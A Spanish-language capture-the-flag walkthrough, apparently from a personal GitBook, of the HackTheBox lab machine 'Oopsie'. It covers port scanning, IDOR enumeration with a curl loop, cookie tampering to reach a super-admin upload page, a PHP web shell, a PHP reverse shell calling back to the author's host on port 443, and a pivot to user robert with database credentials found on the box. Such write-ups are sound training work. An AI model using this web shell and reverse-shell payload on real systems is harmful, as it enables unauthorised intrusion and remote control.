# Oopsie

### Sistema operativo

A través de un lanzamiento de ping podemos averiguar que estamos ante una máquina Linux

```
ping -c 1 10.10.10.28

PING 10.10.10.28 (10.10.10.28) 56(84) bytes of data.
64 bytes from 10.10.10.28: icmp_seq=1 ttl=63 time=42.0 ms

--- 10.10.10.28 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 41.951/41.951/41.951/0.000 ms
```

El ttl es de 63 lo cual es un indicativo de que nos enfrentamos ante una máquina Linux

### Escaneo de puertos

```
nmap -p- --open -T5 10.10.10.28 -n   
            
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 09:59 CEST
Nmap scan report for 10.10.10.28
Host is up (0.062s latency).
Not shown: 63459 closed ports, 2074 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
nmap -p22,80 -sC -sV -n -Pn 10.10.10.28

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-24 10:00 CEST
Nmap scan report for 10.10.10.28
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.37 seconds
```

Realizamos el escaneo de puertos y nos encontramos con el puerto 22 y el puerto 80

#### Puerto 22

El puerto 22 es una conexión por SSH, es decir, un protocolo de conexión remota que permite controlar y modificar los servidores remotos. En este caso si tuviésemos algún tipo de credencial válida podríamos entrar directamente a través de dicho puerto.

Existen también métodos de fuerza bruta y otros, pero en principio vamos a mirar el otro puerto ya que generalmente no vamos a encontrar una forma sencilla de entrar a través de este puerto. Al menos a día de hoy y con mis conocimientos actuales.

#### Puerto 80

Cuando veamos el puerto 80 muy probablemente existe un servidor web levantado, y efectivamente es así en este caso.

![Web del puerto 80](<../../.gitbook/assets/image (9).png>)

Así que vamos a pasarle el whatweb y el wappalyzer para conocerla un poco más. Guiarse por el olfato a la hora de hacer un pentest es importante, pero enumerar y tener cierta información por si falla nuestro olfato también lo es.

![captura del wappalyzer](<../../.gitbook/assets/image (10).png>)

```
whatweb http://10.10.10.28

http://10.10.10.28 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[admin@megacorp.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.28], Script, Title[Welcome]
```

De todas maneras en este caso concreto y tal como explico en [puerto 80 - servidor web](../../pentesting/puertos/80-servidor-web.md) podemos sacar bastante información de forma manual.

En principio a simple vista no vemos nada, los enlaces no funcionan etc... Pero cuando entramos al código fuente:

```
<script src="/cdn-cgi/login/script.js"></script>
```

Eso me hace pensar que probablemente en 10.10.10.28/cdn-cgi/login podemos encontrar algo así que probemos suerte.

![formulario de acceso](<../../.gitbook/assets/image (11).png>)

Al estar en el Starting-Point de HackTheBox se que unas máquinas guardan cierta relación con otras, por lo que puedo probar las credenciales encontradas en Archetype.

User: admin

Password: MEGACORP\_4dm1n!!

Y efectivamente he entrado...

![Sección interna de la web](<../../.gitbook/assets/image (13).png>)

Ahora seguimos haciendo un reconocimiento de la web, recordad que hay que entrar en los enlaces, ver las URL, las cookies...

Nos vamos a la zona Account y vemos la siguiente URL

{% embed url="http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=1" %}

Además vemos que hay una tabla:

![Tabla accounts](<../../.gitbook/assets/image (14).png>)

Existe un ID de usuario, un nombre y un email, pero dentro de la url el id=1 me escama y mucho ¿Qué pasa si lo cambio?

Probando a cambiarlo por 2, 3 y 4 resulta que en el 4 veo algo interesante:

![Tabla accounts (2)](<../../.gitbook/assets/image (15).png>)

Otro Access ID nombre y un email, el caso que aún no se que quiere decir ese Access ID, pero ya hemos encontrado una primera vulnerabilidad porque podemos obtener nombre y email de muchos usuarios.

Pero sigamos comprobando otras cosas, código fuente, otras páginas internas, COOKIES...

Veamos algo de las cookies que es muy interesante...

![EditThisCookie](<../../.gitbook/assets/image (16).png>)

Casualmente la cookie que tenemos puesta es la misma que el Access ID de esta tabla, es decir, podemos hacernos pasar por cualquier usuario cambiando dicha cookie. Pero ¿Si somos admin de que nos sirve? Pues a seguir investigando la web.

![Uploads](<../../.gitbook/assets/image (17).png>)

Parece ser que para poder subir archivos requerimos permisos de super admin, ¿Quizás podemos iterando por los distintos números encontrar la cookie de super admin?

Por supuesto podríamos hacerlo manualmente, pero imaginad que está en el número 927 ¿Vais a probar hasta dar con ello?

Existe una forma de sacar dicha información utilizando Burpsuite, pero únicamente con la edición profesional. Así que lo que podemos hacer es generarnos nuestro propio script para sacar esta información.

En este caso lo voy a hacer en bash ya que es lo que más controlo...

### Script para sacar las credenciales

La idea es ir sacando la información de la tabla modificando la URL parece sencillo, podríamos realizar un bucle que grepee la información interesante y modifique dicho número.

```
for i in $(seq 1 100); do; curl -s --cookie "user=34322" "http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=$i" | grep table | awk '{print $2 $3 }' FS="<td>" | awk '{ print $1 $2 }' FS="</td" | tr ">" ":"; done
```

He decidido hacerlo en un one liner y de forma un poco cutre, así que hay que estar atentos porque también nos da los valores vacíos y no le digo que lo guarde en ningún sitio.

De todas maneras podríamos complicar el script todo lo que quisiésemos aunque para este caso no lo veo tan necesario porque nos encontramos rápido con el Super Admin.

De todas maneras podríamos añadir algún condicional para que elimine campos vacíos, que nos lo ordene mejor, o incluso que únicamente nos mueste el valor de super admin.

Cuando se ejecuta se ve tal que así...

```
:

:

28832:Rafol

:

:

:

:

:

:

86575:super admin

:

```

Lo que está haciendo es un curl para ver el código fuente de la página tras cambiar el número del id, y lo filtramos para que únicamente aparezca la cookie o identificador y el nombre de la persona. Cómo digo podríamos complicarlo más.

Ejemplo one liner que nos borre los campos vacíos:

```
for i in $(seq 0 100); do; url="http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=$i"; usuario=$(curl --cookie "user=34322" "$url" &>/dev/null | grep table | awk '{print $2 $3 }' FS="<td>" | awk '{ print $1 $2 }' FS="</td" | tr ">" ":" | tr -d "\n"); if [[ $usuario == : ]]; then; nada=nada; else; echo -e $i:$usuario; fi; done

1:34322:admin
4:8832:john
13:57633:Peter
23:28832:Rafol
30:86575:super admin
```

De todas maneras lo importante es que tenemos la cookie del super admin, ahora en principio cambiando la cookie con alguna herramienta como EditThisCookie veremos si nos sirve para poder comenzar a subir archivos.

![Uploads como super admin](<../../.gitbook/assets/image (18).png>)

### Reverse Shell

Ahora perfectamente podríamos establecer una reverse shell, directa a nuestra consola o podríamos hacer una de navegador. La idea sería subir un .php "si nos deja" que nos permita obtener acceso a la máquina.

Pero nos encontramos un pequeño problema ¿Dónde se va a subir esta información? ¿Directamente en la raíz? ¿En una carpeta aparte? Y aquí viene la importancia de la enumeración. Algo que no hemos hecho y es una buena práctica es dejar servicios de enumeración trabajando mientras hacemos otras tareas para ahorrarnos tiempo.

En este caso podríamos haber tenido un gobuster o dirbuster buscando distintos directorios, pero no pasa nada nos ponemos ahora con ello.

```
gobuster dir -u http://10.10.10.28/ -w /usr/share/dirb/wordlists/common.txt -t 100 dirb

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.28/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/24 11:49:43 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.28/css/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.28/fonts/]
/images               (Status: 301) [Size: 311] [--> http://10.10.10.28/images/]
/index.php            (Status: 200) [Size: 10932]                               
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.28/js/]    
/.hta                 (Status: 403) [Size: 276]                                 
/.htpasswd            (Status: 403) [Size: 276]                                 
/.htaccess            (Status: 403) [Size: 276]                                 
/server-status        (Status: 403) [Size: 276]                                 
/themes               (Status: 301) [Size: 311] [--> http://10.10.10.28/themes/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.28/uploads/]
                                                                                 
===============================================================
2021/09/24 11:49:50 Finished
===============================================================

```

Aquí vuelve nuestro olfato, ese directorio uploads suena muy bien. Vamos a probar a subir cualquier tipo de archivo por ejemplo una foto de un gato.jpg

![imagen de un gato](<../../.gitbook/assets/image (19).png>)

Así que hemos acertado, dentro de la carpeta uploads se sube lo que nosotros queramos ¿Nos permitirá subir un .php?

![Shell de navegador](<../../.gitbook/assets/image (20).png>)

Efectivamente nos ha dejado, en este caso hemos subido una shell de navegador:

```
<?php

echo"<html>";

echo "<form method=GET><input type=text name=c style=width:400px;'><input type=submit value=Execute style='height:34px;'></form>";

echo "<pre>";
$a = system($_GET["c"]);
echo "</pre></html>";
?>
```

realmente desde esta reverse shell de navegador podríamos establecer una conexión de consola sin ningún problema.

Abrimos un nc en el puerto 443

```
sudo nc -nlvp 443
```

y ahora en nuestra shell de navegador

```
php -r '$sock=fsockopen("10.10.16.1",443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Y ahora un [tratamiento de la tty ](../../pentesting/reverse-shell/tratamiento-de-la-tty.md)como siempre:

```
script /dev/null -c bash

Pulsamos control+z para suspender la shell

stty raw -echo; fg
reset
xterm

export SHELL=bash
export TERM=xterm
stty rows 51 columns 187
```

Ya estamos dentro como www-data

### Escalada de privilegios

Una de las formas de comenzar una escalada de privilegios en Linux es mediante una enumeración manual. Siempre es una buena idea comenzar viendo las carpetas del servidor web, podríamos encontrar alguna credencial de acceso en algún código, backup o incluso en archivo de texto plano.

En este caso en /var/www/html/cdn-cgi/login/db.php nos encontramos lo siguiente:

```
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

Así que existe un usuario llamado robert con esa contraseña, podemos probar a ver si podemos convertirnos en robert con nuestra shell.

```
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert
Password: 
robert@oopsie:/var/www/html/cdn-cgi/login$ 
```

¡Perfecto ya somos robert! podemos seguir enumerando su escritorio a ver si vemos algo... Aunque sólo encontramos la primera key de HTB, pero no información que nos permita convertirnos en root.



> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
